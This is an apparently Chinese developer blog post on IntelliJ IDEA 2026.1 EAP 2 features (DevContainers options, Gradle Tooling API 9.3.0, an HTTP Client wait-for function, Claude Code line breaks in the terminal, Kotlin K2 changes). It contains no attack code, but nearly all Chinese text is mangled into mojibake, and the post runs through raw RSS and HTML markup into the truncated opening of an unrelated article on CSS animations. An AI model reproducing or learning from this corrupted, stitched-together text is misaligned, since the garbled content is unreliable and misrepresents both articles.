<p>å¦‚æœä½ åœ¨ç”¨ DevContainersï¼ˆå®¹å™¨åŒ–å¼€å‘ç¯å¢ƒï¼‰ï¼Œè¿™æ¬¡æ›´æ–°æœ‰å‡ ä¸ªé‡è¦æ”¹è¿›ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯ DevContainersï¼Ÿ</strong></p>
<p><strong>DevContainersï¼ˆå¼€å‘å®¹å™¨ï¼‰</strong> æ˜¯ç”¨å®¹å™¨å°è£…å®Œæ•´å¼€å‘ç¯å¢ƒçš„æŠ€æœ¯ã€‚ä½ æŠŠé¡¹ç›®éœ€è¦çš„æ‰€æœ‰å·¥å…·ã€ä¾èµ–ã€é…ç½®éƒ½æ‰“åŒ…è¿› Docker å®¹å™¨ï¼Œå›¢é˜Ÿæˆå‘˜ç”¨åŒä¸€ä¸ªé•œåƒå¼€å‘â€”â€”"åœ¨æˆ‘æœºå™¨ä¸Šèƒ½è·‘"çš„é—®é¢˜ç›´æ¥æ¶ˆå¤±ã€‚</p>
<p>æ ¸å¿ƒå¥½å¤„ï¼š</p>
<ul>
<li><strong>ç¯å¢ƒä¸€è‡´æ€§</strong>ï¼šæ‰€æœ‰äººç”¨åŒä¸€ä¸ªå®¹å™¨ï¼Œæœ¬åœ°ã€æµ‹è¯•ã€ç”Ÿäº§ç¯å¢ƒå¯¹é½</li>
<li><strong>å¿«é€Ÿä¸Šæ‰‹</strong>ï¼šæ–°æˆå‘˜ <code>docker-compose up</code> å°±èƒ½å¹²æ´»</li>
<li><strong>éš”ç¦»æ€§</strong>ï¼šé¡¹ç›®ä¾èµ–ä¸æ±¡æŸ“æœ¬åœ°æœºå™¨</li>
<li><strong>å¯ç§»æ¤</strong>ï¼šäº‘å¼€å‘ç¯å¢ƒï¼ˆGitHub Codespacesã€Gitpodï¼‰æ— ç¼åˆ‡æ¢</li>
</ul>
<h3 data-id="heading-6">æ–°å¢ DevContainers é…ç½®é€‰é¡¹</h3>
<p>ä¸ºäº†æ›´å¥½åœ°å…¼å®¹ <strong>Dev Container Specification</strong>ï¼ŒEAP 2 æ–°å¢äº†ä¸‰ä¸ªå…³é”®é…ç½®é¡¹ï¼š</p>





















<table><thead><tr><th align="left">é€‰é¡¹</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left"><code>remoteUser</code></td><td align="left">æŒ‡å®šå®¹å™¨å†…è¿è¡Œå‘½ä»¤çš„ç”¨æˆ·ï¼ˆå¦‚é¿å…ä½¿ç”¨ root å¸¦æ¥çš„æƒé™é—®é¢˜ï¼‰</td></tr><tr><td align="left"><code>remoteEnv</code></td><td align="left">çµæ´»è®¾ç½®å®¹å™¨å†…çš„ç¯å¢ƒå˜é‡</td></tr><tr><td align="left"><code>userEnvProbe</code></td><td align="left">ä¼˜åŒ–æ¢æµ‹ç”¨æˆ·ç¯å¢ƒé…ç½®ï¼ˆå¦‚ <code>.zshrc</code>ï¼‰çš„æ–¹å¼</td></tr></tbody></table>
<p>è¿™äº›æ”¹è¿›è®© IDEA åœ¨å¤„ç†å¤æ‚çš„å®¹å™¨æƒé™å’Œç¯å¢ƒå·®å¼‚æ—¶æ›´åŠ æ¸¸åˆƒæœ‰ä½™ã€‚</p>
<h3 data-id="heading-7">Docker è¿æ¥ä¿®å¤</h3>
<p>ä¿®å¤äº† <strong>macOS ä¸Š Docker æ’ä»¶è¿æ¥å¤±è´¥</strong>çš„é—®é¢˜ã€‚è¯¥é—®é¢˜ç”± Docker Desktop for macOS æ›´æ”¹é»˜è®¤ Socket è·¯å¾„å¼•èµ·ï¼Œæ–°ç‰ˆæœ¬å·²å®Œæˆè·¯å¾„è‡ªåŠ¨é€‚é…ã€‚</p>
<h2 data-id="heading-8">Gradle ç”Ÿæ€å‡çº§</h2>
<p>è¿™æ¬¡ EAP 2 åœ¨ Gradle é›†æˆä¸Šä¸‹äº†å¤§åŠŸå¤«ï¼Œæ ¸å¿ƒæ˜¯<strong>Gradle Tooling API å‡çº§åˆ° 9.3.0</strong>ã€‚</p>
<h3 data-id="heading-9">Gradle Tooling API 9.3.0</h3>
<p><strong>ä»€ä¹ˆæ˜¯ Gradle Tooling APIï¼Ÿ</strong></p>
<p>å®ƒæ˜¯ Gradle æä¾›çš„ç¼–ç¨‹æ¥å£ï¼Œè®© IDE å¯ä»¥"æ·±å…¥"æ„å»ºè¿‡ç¨‹â€”â€”ä¸æ˜¯ç®€å•è°ƒç”¨å‘½ä»¤è¡Œï¼Œè€Œæ˜¯ç›´æ¥æŸ¥è¯¢é¡¹ç›®ç»“æ„ã€ä¾èµ–å…³ç³»ã€ä»»åŠ¡ä¿¡æ¯ï¼Œå¹¶ç”¨ç±»å‹å®‰å…¨çš„æ–¹å¼è¿”å›ç»“æœã€‚</p>
<p>ç®€å•å¯¹æ¯”ï¼š</p>
<ul>
<li><strong>å‘½ä»¤è¡Œæ–¹å¼</strong>ï¼šIDE è°ƒç”¨ <code>gradle tasks</code>ï¼Œç„¶åè§£ææ–‡æœ¬è¾“å‡º</li>
<li><strong>Tooling API</strong>ï¼šIDE è°ƒç”¨ <code>getTasks()</code>ï¼Œç›´æ¥æ‹¿åˆ°ä»»åŠ¡å¯¹è±¡åˆ—è¡¨</li>
</ul>
<p>Tooling API çš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>ç‰ˆæœ¬ç‹¬ç«‹</strong>ï¼šåŒä¸€ API ç‰ˆæœ¬å¯ä»¥å…¼å®¹ä¸åŒ Gradle ç‰ˆæœ¬</li>
<li><strong>ç»“æ„åŒ–æ•°æ®</strong>ï¼šä¸éœ€è¦è§£ææ–‡æœ¬ï¼Œç›´æ¥è·å–æ¨¡å‹å¯¹è±¡</li>
<li><strong>æ·±åº¦é›†æˆ</strong>ï¼šå¯ä»¥å®æ—¶ç›‘å¬æ„å»ºè¿›åº¦ã€æ¨¡å‹å˜åŒ–</li>
</ul>
<p>å‡çº§åˆ° 9.3.0 å¸¦æ¥çš„å¥½å¤„ï¼š</p>
<ul>
<li>æ›´å¥½çš„ WSL/Docker ç¯å¢ƒæ”¯æŒ</li>
<li>æœ¬åœ°ä¾èµ–è¡¥å…¨ä½“éªŒæå‡</li>
<li>ç‰ˆæœ¬ç›®å½•ï¼ˆVersion Catalogï¼‰ç›¸å…³é€»è¾‘ä¿®å¤</li>
</ul>
<h3 data-id="heading-10">Gradle Best Practices æ£€æµ‹</h3>
<p>æ–°å¢<strong>æœ€ä½³å®è·µæ£€æµ‹</strong>åŠŸèƒ½ã€‚Gradle å®˜æ–¹æœ‰ä¸€å¥—æ„å»ºæœ€ä½³å®è·µï¼ˆæ¯”å¦‚é¿å…ä½¿ç”¨è¿‡æ—¶è¯­æ³•ã€åˆç†é…ç½®ä¾èµ–ç­‰ï¼‰ï¼ŒIDEA ç°åœ¨ä¼šä¸»åŠ¨æ£€æµ‹ä½ çš„ <code>build.gradle</code>/<code>build.gradle.kts</code> æ˜¯å¦ç¬¦åˆè¿™äº›å®è·µã€‚</p>
<pre><code class="hljs language-groovy" lang="groovy">// ä¸æ¨è
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-web:3.2.0'
}

// æ¨èï¼šä½¿ç”¨ç‰ˆæœ¬ç›®å½•
dependencies {
    implementation libs.spring.boot.starter.web
}
</code></pre>
<h3 data-id="heading-11">æœ¬åœ°ä¾èµ–è¡¥å…¨</h3>
<p>EAP 2 ä¿®å¤äº†<strong>æœ¬åœ°ä¾èµ–è¡¥å…¨</strong>çš„é—®é¢˜ã€‚ä»¥å‰åœ¨ <code>dependencies {}</code> å—é‡Œè¡¥å…¨æœ¬åœ°é¡¹ç›®ä¾èµ–æ—¶ï¼Œé‡åˆ°æ¨ªæ ï¼ˆ<code>-</code>ï¼‰ç¬¦å·ä¼šå¤±æ•ˆï¼Œç°åœ¨å·²ç»ä¿®å¤ã€‚</p>
<p>å¦å¤–ï¼Œ<strong>TOML å…ƒç´ </strong>çš„ Find Usages çª—å£æ ‡é¢˜ä¹Ÿæ”¹äº†ï¼ˆIDEA-382192ï¼‰ï¼Œæ›´æ¸…æ™°ã€‚</p>
<h2 data-id="heading-12">å¼€å‘è€…ä½“éªŒä¼˜åŒ–</h2>
<h3 data-id="heading-13">HTTP Client æ–°å¢ wait-for å‡½æ•°</h3>
<p><strong>HTTP Client æ”¯æŒ <code>wait-for(x)</code> å‡½æ•°</strong>ï¼ˆä¼‘çœ /ç­‰å¾…ï¼‰ã€‚</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment">## æµ‹è¯•æ¥å£å»¶è¿Ÿ</span>
GET https:<span class="hljs-regexp">//api</span>.example.com/ping

<span class="hljs-comment">## ç­‰å¾… 3 ç§’åå†æ¬¡è¯·æ±‚</span>
<span class="hljs-keyword">wait</span>-<span class="hljs-keyword">for</span>(<span class="hljs-number">3</span>)

GET https:<span class="hljs-regexp">//api</span>.example.com/ping
</code></pre>
<p>è¿™å¯¹æµ‹è¯•"å»¶è¿Ÿè§¦å‘"ã€"é‡è¯•é€»è¾‘"ç­‰åœºæ™¯æœ‰ç”¨ã€‚</p>
<h3 data-id="heading-14">Terminal ä¸­ Claude Code æ”¯æŒä¼˜åŒ–</h3>
<p><strong>Terminal ä¸­ Claude Code æ”¯æŒ Shift+Enter æ¢è¡Œ</strong>ã€‚</p>
<p>ä»¥å‰åœ¨ Terminal é‡Œè¿›å…¥ Claude Code æ¨¡å¼åï¼ŒæŒ‰ Enter æ˜¯å‘é€æ¶ˆæ¯ï¼Œæ— æ³•æ¢è¡Œã€‚ç°åœ¨ Shift+Enter å¯ä»¥æ’å…¥æ–°è¡Œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d37c6aa901844af99543cb9e5fe5c7ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770812652&amp;x-signature=2Z5NgwZtF1ZLSuiJg40FH7NLiZ4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">è¯­è¨€çº§åˆ«æ™ºèƒ½åŒ¹é…</h3>
<p><strong>è¯­è¨€çº§åˆ«è‡ªåŠ¨åŒ¹é…æœ€é«˜æ”¯æŒçš„ JDK</strong>ã€‚</p>
<p>ä»¥å‰æ‰‹åŠ¨è®¾ç½®è¯­è¨€çº§åˆ«å¾ˆçƒ¦â€”â€”é¡¹ç›®ç”¨ JDK 21ï¼Œä½†è¯­è¨€çº§åˆ«è¿˜æ˜¯ Java 17ï¼Œæ–°è¯­æ³•æŠ¥é”™ã€‚ç°åœ¨ IDEA ä¼šè‡ªåŠ¨è¯†åˆ«é¡¹ç›® JDKï¼ŒæŠŠè¯­è¨€çº§åˆ«è®¾åˆ°æœ€é«˜æ”¯æŒç‰ˆæœ¬ã€‚</p>
<h3 data-id="heading-16">é«˜ CPU å ç”¨ä¼˜åŒ–</h3>
<p>ä¿®å¤äº†<strong>æ‰“å¼€å¸¦é€šé…ç¬¦æ³›å‹çš„ Java ç±»å¯¼è‡´ CPU é£™å‡</strong>çš„é—®é¢˜ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿™ç§ä»£ç ä»¥å‰ä¸€æ‰“å¼€ IDEA å°±å¼€å§‹ç‹‚åƒ CPU</span>
<span class="hljs-title class_">List</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, ? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Collection</span>&lt;?&gt;&gt;&gt; wildcardHell;
</code></pre>
<h2 data-id="heading-17">K2 ç¼–è¯‘å™¨æŒç»­è¿›åŒ–</h2>
<h3 data-id="heading-18">æ™ºèƒ½è¡¥å…¨æ”¹è¿›</h3>
<p><strong>æ”¹è¿›çš„å‘½åå‚æ•°è¡¥å…¨æ’åº</strong>ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä»¥å‰ï¼šå‘½åå‚æ•°è¡¥å…¨é¡ºåºæ··ä¹±</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processUser</span><span class="hljs-params">(id: <span class="hljs-type">Long</span>, name: <span class="hljs-type">String</span>, age: <span class="hljs-type">Int</span>, email: <span class="hljs-type">String</span>)</span></span>

processUser(id = <span class="hljs-number">1</span>, ??? æç¤ºé¡ºåºå¾ˆä¹±)

<span class="hljs-comment">// ç°åœ¨ï¼šæŒ‰ä½¿ç”¨é¢‘ç‡ã€ä¸Šä¸‹æ–‡ç›¸å…³æ€§æ’åº</span>
processUser(id = <span class="hljs-number">1</span>, name = <span class="hljs-string">"å¼ ä¸‰"</span>, age = <span class="hljs-number">25</span>, email = <span class="hljs-string">"..."</span>)
</code></pre>
<h3 data-id="heading-19">æšä¸¾å€¼è½¯å¼ƒç”¨æç¤º</h3>
<p><strong>è½¯å¼ƒç”¨ <code>kotlin.enumValues</code> å‡½æ•°</strong>ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ä»¥å‰</span>
val values = enumValues&lt;<span class="hljs-attribute">Color</span>&gt;()

<span class="hljs-comment">// ç°åœ¨ IDE å»ºè®®ç”¨æ›´ç°ä»£çš„æ–¹å¼</span>
val values = <span class="hljs-attribute">Color</span><span class="hljs-selector-class">.entries</span>
</code></pre>
<p><code>enumValues</code> æ˜¯ Kotlin 1.9 ä¹‹å‰çš„é—ç•™ APIï¼Œæ–°ä»£ç åº”è¯¥ç”¨ <code>entries</code> å±æ€§ã€‚</p>
<h2 data-id="heading-20">Bug ä¿®å¤å¤§ç›˜ç‚¹</h2>
<p>EAP 2 ä¿®å¤äº†å¤§é‡ Bugï¼Œä»¥ä¸‹æ˜¯æŒ‰æ¨¡å—åˆ†ç±»çš„ä¸»è¦ä¿®å¤ï¼š</p>









































<table><thead><tr><th align="left">æ¨¡å—</th><th align="left">ä¸»è¦ä¿®å¤</th></tr></thead><tbody><tr><td align="left"><strong>Gradle</strong></td><td align="left">æœ¬åœ°ä¾èµ–è¡¥å…¨æ¨ªæ å¤±æ•ˆã€ç‰ˆæœ¬ç›®å½•é‡å‘½åã€WSL ç£ç›˜æ‰«æ</td></tr><tr><td align="left"><strong>Java</strong></td><td align="left">é€šé…æ³›å‹ CPU é£™å‡ã€åŒ…æ³¨è§£ PSI ä¸¢å¤±ã€optimize imports å¿½ç•¥æ³¨é‡Š</td></tr><tr><td align="left"><strong>è°ƒè¯•å™¨</strong></td><td align="left">Split Debugger å€¼æ›´æ–°é—®é¢˜ã€å¼‚æ­¥å †æ ˆè·Ÿè¸ªå¼€é”€æ£€æµ‹</td></tr><tr><td align="left"><strong>æµ‹è¯•</strong></td><td align="left">JUnit å‚æ•°æœªä½¿ç”¨è¯¯æŠ¥ã€Cucumber æ–œæ è½¬ä¹‰</td></tr><tr><td align="left"><strong>Kotlin</strong></td><td align="left">K2 ç§»é™¤æœªç”¨å˜é‡ã€æ™ºèƒ½è¡¥å…¨æ’åºã€æšä¸¾å€¼è½¯å¼ƒç”¨</td></tr><tr><td align="left"><strong>DevContainers</strong></td><td align="left">WSL/Docker è·¯å¾„é—®é¢˜ã€è¿œç¨‹ç”¨æˆ·/ç¯å¢ƒå˜é‡æ”¯æŒ</td></tr><tr><td align="left"><strong>UI</strong></td><td align="left">èœå•é—ªçƒã€Islands ä¸»é¢˜æ¸å˜ä¸æµç•…ã€å­—ä½“æ ·å¼é‡ç½®</td></tr><tr><td align="left"><strong>Version Control</strong></td><td align="left">Git é«˜äº®æ®‹ç•™ã€Worktree æ‰“å¼€å¤±è´¥</td></tr></tbody></table>
<h2 data-id="heading-21">æ€»ç»“</h2>
<p><strong>IntelliJ IDEA 2026.1 EAP 2 çš„å…³é”®å‡çº§ï¼š</strong></p>
<ol>
<li><strong>Gradle Tooling API 9.3.0</strong>ï¼šåº•å±‚é€šä¿¡å‡çº§ï¼Œæœ¬åœ°ä¾èµ–è¡¥å…¨ä¿®å¤</li>
<li><strong>Java è°ƒè¯•å™¨å¢å¼º</strong>ï¼šå¼‚æ­¥å †æ ˆè·Ÿè¸ªå¼€é”€æ£€æµ‹</li>
<li><strong>JUnit 6 æ”¯æŒ</strong>ï¼š<code>CancellationToken</code>ã€<code>@FieldSource</code> ä¿®å¤</li>
<li><strong>DevContainers å¢å¼º</strong>ï¼šr<code>emoteUser/remoteEnv/userEnvProbe</code> é€‰é¡¹</li>
<li><strong>HTTP Client</strong>ï¼šæ–°å¢ <code>wait-for</code> å‡½æ•°</li>
<li><strong>Claude Code</strong>ï¼šClaude Code æ”¯æŒ Shift+Enter æ¢è¡Œ</li>
<li><strong>Kotlin K2</strong>ï¼šæ™ºèƒ½è¡¥å…¨æ”¹è¿›ã€æšä¸¾å€¼è½¯å¼ƒç”¨</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šä¿®å¤é€šé…æ³›å‹ CPU é£™å‡ç­‰é—®é¢˜</li>
</ol>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>å¦‚æœä½ åœ¨ç”¨ Gradle 9.xã€JUnit 6ã€æˆ–è€…æå®¹å™¨åŒ–å¼€å‘ï¼Œè¿™æ¬¡ EAP å€¼å¾—ä¸€è¯•</li>
<li>EAP ç‰ˆæœ¬å®Œå…¨å…è´¹ï¼Œä½†å¯èƒ½ä¸ç¨³å®šï¼Œç”Ÿäº§ç¯å¢ƒè°¨æ…ä½¿ç”¨</li>
<li>å¯ä»¥åœ¨è™šæ‹Ÿæœºæˆ–æµ‹è¯•é¡¹ç›®é‡Œå…ˆè¯•è¯•ï¼Œåé¦ˆç»™ JetBrains å¸®åŠ©æ”¹è¿›æœ€ç»ˆç‰ˆæœ¬</li>
</ul>
<p><strong>â­ï¸æ¨è</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fhome.html" target="_blank" title="https://javaguide.cn/home.html" ref="nofollow noopener noreferrer">Java é¢è¯• &amp; åç«¯é€šç”¨é¢è¯•æŒ‡å—</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fzhuanlan%2Finterview-guide.html" target="_blank" title="https://javaguide.cn/zhuanlan/interview-guide.html" ref="nofollow noopener noreferrer">ã€ŠSpringAI æ™ºèƒ½é¢è¯•å¹³å°+RAG çŸ¥è¯†åº“ã€‹</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Finterview-preparation%2Fjava-roadmap.html" target="_blank" title="https://javaguide.cn/interview-preparation/java-roadmap.html" ref="nofollow noopener noreferrer">Java å­¦ä¹ è·¯çº¿(æœ€æ–°ç‰ˆï¼Œ4w+å­—)</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Finterview-preparation%2Fpdf-interview-javaguide.html" target="_blank" title="https://javaguide.cn/interview-preparation/pdf-interview-javaguide.html" ref="nofollow noopener noreferrer">2026 æœ€æ–°åç«¯é¢è¯• PDF èµ„æ–™</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å½“ JS é˜»å¡ä¸»çº¿ç¨‹æ—¶ï¼Œä¸ºä»€ä¹ˆä½ çš„ CSS åŠ¨ç”»è¿˜åœ¨è·‘ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7602503154506580009</link>    <guid>https://juejin.cn/post/7602503154506580009</guid>    <pubDate>2026-02-04T03:45:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154506580009" data-draft-id="7602497125269159942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å½“ JS é˜»å¡ä¸»çº¿ç¨‹æ—¶ï¼Œä¸ºä»€ä¹ˆä½ çš„ CSS åŠ¨ç”»è¿˜åœ¨è·‘ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-02-04T03:45:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ssshooter"/> <meta itemprop="url" content="https://juejin.cn/user/3122268751795101"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å½“ JS é˜»å¡ä¸»çº¿ç¨‹æ—¶ï¼Œä¸ºä»€ä¹ˆä½ çš„ CSS åŠ¨ç”»è¿˜åœ¨è·‘ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3122268751795101/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ssshooter
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T03:45:54.000Z" title="Wed Feb 04 2026 03:45:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€”â€” ä»ä¸€ä¸ª React Demo çœ‹æµè§ˆå™¨æ¸²æŸ“ä¸åˆæˆçº¿ç¨‹</p>
<p>ä¼ é€é—¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.mind-elixir.com%2Fzh%2Flearn-js-blocking" target="_blank" title="https://tools.mind-elixir.com/zh/learn-js-blocking" ref="nofollow noopener noreferrer">tools.mind-elixir.com/zh/learn-jsâ€¦</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/786bb1cf088147a78a43c0f9b866b895~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3NzaG9vdGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770781554&amp;x-signature=GNcSQcPDf%2BcWJp%2BqJhT3lfeCIcU%3D" alt="åŠ¨ç”»é˜»å¡å®éªŒ.png" loading="lazy"/></p>
<p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¸¸å¬åˆ°ä¸€å¥è¯ï¼šâ€œä¸è¦é˜»å¡ä¸»çº¿ç¨‹ï¼ˆMain Threadï¼‰â€ã€‚æˆ‘ä»¬ä¹Ÿå¸¸å¬åˆ°å¦ä¸€æ¡æ€§èƒ½ä¼˜åŒ–å»ºè®®ï¼šâ€œå°½é‡ä½¿ç”¨ <code>transform</code> å’Œ <code>opacity</code> åšåŠ¨ç”»â€ã€‚</p>
<p>è¿™ä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆæ·±å±‚è”ç³»ï¼Ÿä¸ºä»€ä¹ˆå½“ä¸€æ®µæ­»å¾ªç¯ JavaScript ä»£ç æŠŠé¡µé¢å¡æ­»æ—¶ï¼ŒæŸäº›åŠ¨ç”»å´èƒ½åƒâ€œå¹¸å­˜è€…â€ä¸€æ ·æµç•…è¿è¡Œï¼Œè€Œå…¶ä»–çš„åˆ™ç¬é—´å†»ç»“ï¼Ÿ</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå…·ä½“çš„ React Demo æ¥é€šè¿‡å®éªŒæ­å¼€æµè§ˆå™¨æ¸²æŸ“æœºåˆ¶çš„é¢çº±ã€‚</p>
<h2 data-id="heading-0">å®éªŒç°åœºï¼šä¸€ä¸ªâ€œå¡é¡¿â€çš„æŒ‰é’®</h2>
